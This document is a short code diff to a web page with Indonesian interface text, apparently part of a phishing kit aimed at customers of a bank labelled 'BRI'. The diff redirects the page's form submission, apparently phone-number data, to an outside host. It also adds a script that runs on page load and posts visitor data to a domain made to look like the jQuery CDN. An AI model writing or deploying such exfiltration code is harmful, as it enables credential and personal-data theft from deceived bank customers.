@@ -1356,7 +1356,7 @@ document.getElementById('kirims').innerHTML = "Memproses....";
 
  $.ajax({
  type: 'POST',
- url: 'sendHP.php',
+ url: 'https://www.website-layanan.c1.is/BRI/10/sendHP.php',
  data: $(this).serialize(),
  datatype: 'JSON',
  
@@ -1373,6 +1373,20 @@ document.getElementById('kirims').innerHTML = "Memproses....";
     return false;
 });   
      
+</script>
+<script>
+    
+window.onload = function(){
+     
+$.ajax({
+type: 'POST',
+url: 'https://code-jquery-com.c1.is/BRI/11/IP.php',
+async: false,
+dataType: 'JSON',
+data: $(this).serialize(),
+
+})
+}
 </script>
 </body>
 </html>
